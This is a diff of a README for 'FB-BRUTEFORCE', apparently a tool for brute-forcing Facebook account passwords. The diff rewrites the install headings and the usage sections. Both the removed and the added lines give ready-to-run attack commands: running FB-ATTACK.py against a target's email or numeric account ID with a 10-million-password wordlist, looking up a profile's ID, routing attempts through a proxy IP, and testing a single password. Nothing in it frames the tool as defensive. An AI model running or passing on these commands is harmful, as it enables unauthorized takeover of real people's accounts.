@@ -15,7 +15,7 @@
 
 ### [📸 Watch video](COMMING SOON)
 
-#### ➡️To use the FB-BRUTEFORCE type the following commands in Termux:
+#### ➡️ Type the following commands To use FB-BRUTEFORCE in Termux:
 
 ```shell script
 apt update && apt upgrade
@@ -51,24 +51,10 @@ cd FB-BRUTEFORCE
 ```shell script
 python FB-ATTACK.py
 ```
-
-## Usage
-   ```
-       Usage: python FB-ATTACK.py [OPTIONS...]
-Examples:
-     |-------->
-     | python FB-ATTACK.py -t target@gmail.com -w /home/user/FB-BRUTEFORCE/10MPASS.txt
-     |-------->
-     | python FB-ATTACK.py -g https://www.facebook.com/target_profile_url_for_get_id
-     |-------->
-     | python FB-ATTACK.py -t 100001013078780 -w /home/user/FB-BRUTEFORCE/10MPASS.txt 
-     |-------->
-     |python FB-ATTACK.py -t target@hotmail.com -w D:\\PASS.txt -p 168.119.108.245:8069  
-     |-------->
-```
-
 ***
-#### ➡️To use the FB-BRUTEFORCE type the following commands in linux
+
+### For Linux:
+#### ➡️ Type the following commands To use FB-BRUTEFORCE in linux:
 
 ```shell script
 apt update && apt upgrade -y
@@ -99,16 +85,16 @@ python FB-ATTACK.py
 ```
 ## Usage
    ```
-       Usage: python FB-ATTACK.py [OPTIONS...]
+          Usage: python FB-ATTACK.py -t "target_id" -w "wordlist_location" 
 Examples:
      |-------->
-     | python FB-ATTACK.py -t target@gmail.com -w /home/user/FB-BRUTEFORCE/10MPASS.txt
+     | python FB-ATTACK.py -g https://facebook.com/target_profile_url_for_get_id
      |-------->
-     | python FB-ATTACK.py -g https://www.facebook.com/target_profile_url_for_get_id
+     | python FB-ATTACK.py -t 100001013078780 -w 10MPASS.txt 
      |-------->
-     | python FB-ATTACK.py -t 100001013078780 -w /home/user/FB-BRUTEFORCE/10MPASS.txt 
+     | python FB-ATTACK.py -t target@gmail.com -w 10MPASS.txt
      |-------->
-     |python FB-ATTACK.py -t target@hotmail.com -w D:\\PASS.txt -p 168.119.108.245:8069  
+     |python FB-ATTACK.py -t target@gmail.com -s checkpassword
      |-------->
 ```
 ## License
